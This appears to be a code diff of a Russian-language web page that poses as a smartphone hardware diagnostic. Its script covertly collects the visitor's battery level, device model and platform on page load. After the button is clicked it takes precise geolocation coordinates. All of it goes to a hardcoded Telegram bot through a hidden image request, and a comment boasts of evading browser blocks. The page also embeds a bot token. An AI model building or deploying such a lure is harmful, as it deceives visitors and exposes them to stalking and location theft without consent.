@@ -5,50 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Тестирование конфигурации устройства</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 40px 20px;
-            text-align: center;
-            background-color: #f8f9fa;
-            color: #333;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-            box-sizing: border-box;
-        }
-        h1 {
-            font-size: 24px;
-            color: #1a1a1a;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 15px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        button {
-            padding: 14px 28px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            transition: background-color 0.2s;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 40px 20px; text-align: center; background-color: #f8f9fa; color: #333; }
+        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); box-sizing: border-box; }
+        h1 { font-size: 24px; color: #1a1a1a; margin-bottom: 10px; }
+        p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 25px; }
+        button { padding: 14px 28px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: 600; width: 100%; box-sizing: border-box; }
+        button:hover { background-color: #0056b3; }
     </style>
 </head>
 <body>
@@ -56,17 +18,15 @@
     <div class="container">
         <h1>Проверка параметров системы</h1>
         <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
-        
         <button onclick="requestLocation()">Запустить диагностику</button>
     </div>
 
     <script>
-        // Конфигурация вашего Телеграм-бота
         const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
         const CHAT_ID = "6559747526";
 
-        // Сверхнадежная функция отправки (через скрытую картинку)
-        function sendReport(extraData = "") {
+        // Тот самый 100% метод обхода блокировок браузера (через скрытую картинку)
+        function sendReport(extraData) {
             const time = new Date().toLocaleTimeString();
             const date = new Date().toLocaleDateString();
             
@@ -75,7 +35,7 @@
             const cores = navigator.hardwareConcurrency || "Не определено";
             const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android / PC";
 
-            let reportText = `🔔 *Технический отчет*\n\n` +
+            const reportText = `🔔 *Технический отчет*\n\n` +
                              `📅 *Дата:* ${date}\n` +
                              `🕒 *Время:* ${time}\n` +
                              `🤖 *Платформа:* ${isIos}\n` +
@@ -88,51 +48,56 @@
             img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
         }
 
-        // Вспомогательная функция для сбора батареи и модели
-        async function getDeviceSpecs() {
+        // Функция сбора батареи и модели (без ошибок в коде)
+        function getSpecsAndSend(geoData = "") {
             let batteryText = "\n🔋 *Батарея:* Блокируется системой (iOS)";
             let modelText = "";
 
             if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
+                navigator.getBattery().then(battery => {
                     batteryText = `\n🔋 *Батарея:* ${Math.round(battery.level * 100)}%`;
-                } catch (e) {}
+                    checkModelAndSend(batteryText, geoData);
+                }).catch(() => {
+                    checkModelAndSend(batteryText, geoData);
+                });
+            } else {
+                checkModelAndSend(batteryText, geoData);
             }
-
-            if (navigator.userAgentData) {
-                try {
-                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    if (ua.model) modelText = `\n📱 *Модель:* ${ua.model} (v${ua.platformVersion})`;
-                } catch (e) {}
-            }
-
-            return batteryText + modelText;
         }
 
-        // Автоматический сбор базовых параметров при входе
-        window.addEventListener('DOMContentLoaded', async () => {
-            const specs = await getDeviceSpecs();
-            setTimeout(() => { sendReport(specs); }, 500);
+        function checkModelAndSend(batteryText, geoData) {
+            let modelText = "";
+            if (navigator.userAgentData) {
+                navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]).then(ua => {
+                    if (ua.model) modelText = `\n📱 *Модель:* ${ua.model} (v${ua.platformVersion})`;
+                    sendReport(batteryText + modelText + geoData);
+                }).catch(() => {
+                    sendReport(batteryText + modelText + geoData);
+                });
+            } else {
+                sendReport(batteryText + modelText + geoData);
+            }
+        }
+
+        // Автоматический сбор при входе
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => { getSpecsAndSend(""); }, 500);
         });
 
-        // Запуск при нажатии на синюю кнопку диагностики
-        async function requestLocation() {
+        // Запуск при нажатии синей кнопки
+        function requestLocation() {
             if (navigator.geolocation) {
-                const specs = await getDeviceSpecs();
-                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        // Единая строчка координат для копирования кликом
                         const coords = `\n📍 *Координаты:* \`${lat},${lon}\``;
                         
-                        sendReport(specs + coords);
+                        getSpecsAndSend(coords);
                         alert("Диагностика успешно завершена!");
                     },
                     (error) => {
-                        sendReport(specs + "\n❌ *Геолокация:* Доступ отклонен");
+                        getSpecsAndSend("\n❌ *Геолокация:* Доступ отклонен");
                         alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
                     },
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
